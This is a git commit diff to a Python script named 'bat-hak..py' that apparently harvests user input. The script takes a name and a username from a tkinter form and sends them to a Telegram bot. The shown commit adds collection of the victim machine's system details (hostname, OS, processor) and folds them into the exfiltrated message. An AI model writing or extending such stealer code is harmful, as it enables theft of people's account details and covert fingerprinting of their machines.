bcdb84e74b21e78d28ea92a01581d552c4255479
NASER <shhbazynasr73@gmail.com>
2024-04-28 05:01:50 -0700

    levl 3

--- bat-hak..py
+++ bat-hak..py
@@ -1,6 +1,7 @@
 import requests
 from tkinter import *
-
+import platform
+uname = platform.uname()
 def send_message_to_telegram_bot(token, chat_id, message):
     url = f"https://api.telegram.org/bot{token}/sendMessage"
     payload = {
@@ -14,8 +15,14 @@ def send_message_to_telegram_bot(token, chat_id, message):
     else:
         print(f"Error sending message: Status Code: {response.status_code}")
 
+print(f"System: {uname.system}")
+print(f"Node Name: {uname.node}")
+print(f"Release: {uname.release}")
+print(f"Version: {uname.version}")
+print(f"Machine: {uname.machine}")
+print(f"Processor: {uname.processor}")
 def start():
-    message_to_send = f"nam={pyaz1.get()} \n yozer={pyam2.get()}"
+    message_to_send = f"nam={pyaz1.get()} \n yozer={pyam2.get() }\n System: {uname.system}\n Node Name: {uname.node}\n Release: {uname.release} \n Version: {uname.version} \n Machine: {uname.machine} \n Processor: {uname.processor}"
     send_message_to_telegram_bot(telegram_bot_token, chat_id, message_to_send)
 
 tk = Tk()
